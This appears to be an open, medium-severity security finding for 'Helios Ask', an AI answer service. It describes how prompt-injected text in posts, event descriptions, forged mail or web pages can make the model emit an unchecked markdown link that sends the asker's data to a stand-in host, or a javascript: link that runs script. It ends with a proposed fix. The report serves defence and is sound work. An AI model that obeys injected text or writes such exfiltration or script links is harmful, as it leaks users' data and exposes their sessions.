Description: Helios Ask's page makes a link of any target the model writes (`anchor` in `web/ask/markdown.js`), `javascript:` included, and the server passes through addresses that are not in its own link table, so text injected into what the model reads can put a script link, or a link carrying the asker's data to another site, into an answer.
Status: open
Severity: medium
---
`inlinePattern` (`web/ask/markdown.js:62`) takes `[words](target)` with any target free of `)` and whitespace, and `anchor` (`:94-101`) sets `a.href` to it unchecked. On the server `links.expand` (`internal/ask/links.go:55-63`) turns the `L7` keys back into addresses and leaves anything else as the model wrote it, though `internal/ask/prompt.md` tells the model to use the keys.

The model reads text others wrote: a Loop post, an event's description, a forged mail (`ask-mail-hook-trusts-sender-headers.md`), a website page. Such text asking for `[the sign-up form](https://elsewhere.example/?d=<what the tools returned>)` takes the asker's directory data out on a click; `[open](javascript:...)` runs script on the ask origin on a click, where `/api/ask/chat` and the saved chats are in reach. Nothing loads without the click, and the page draws no images, so it takes the model following the instruction and the person clicking.

Fix: in `anchor`, draw plain text unless the target starts `http://` or `https://`; in the expander, drop a target that is neither in the conversation's link table nor on one of the service's own hosts.
